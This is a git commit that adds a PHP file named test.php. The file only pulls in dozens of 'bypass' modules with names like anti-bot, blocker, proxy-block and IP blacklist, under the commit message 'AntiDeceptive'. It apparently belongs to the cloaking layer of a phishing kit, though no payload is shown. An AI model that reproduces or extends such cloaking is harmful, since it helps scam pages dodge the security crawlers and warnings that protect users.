591478780f71633418139b0067ede1beb878c366
asklahanov2121 <128796933+asklahanov2121@users.noreply.github.com>
2023-12-05 10:42:06 +0800

    AntiDeceptive

---
+++ test.php
@@ -0,0 +1,34 @@
+<?php
+  	require './bypass/anti1.php';
+	require './bypass/anti2.php';
+	require './bypass/anti3.php';
+	require './bypass/anti4.php';
+	require './bypass/anti5.php';
+	require './bypass/anti6.php';
+	require './bypass/anti7.php';
+	require './bypass/anti8.php';
+        require './bypass/antibots.php';
+        require './bypass/blocker.php';
+        require './bypass/bots.php';
+        require './bypass/bots2.php';
+        require './bypass/antibots1.php';
+        require './bypass/antibots2.php';
+        require './bypass/antibots3.php';
+        require './bypass/antibots4.php';
+        require './bypass/antibots5.php';
+        require './bypass/antibots6.php';
+        require './bypass/block3.php';
+        require './bypass/proxyblock.php';
+        require './bypass/blacklistips.txt';
+        require './bypass/blacklist.dat';
+        require './bypass/blocker_1.php';
+        require './bypass/blocker_2.php';
+        require './bypass/blocker_3.php';
+        require './bypass/blocker_4.php';
+        require './bypass/blackhole.dat';
+        require './bypass/bot.php';
+        require './bypass/filter.php';
+
+
+
+?>
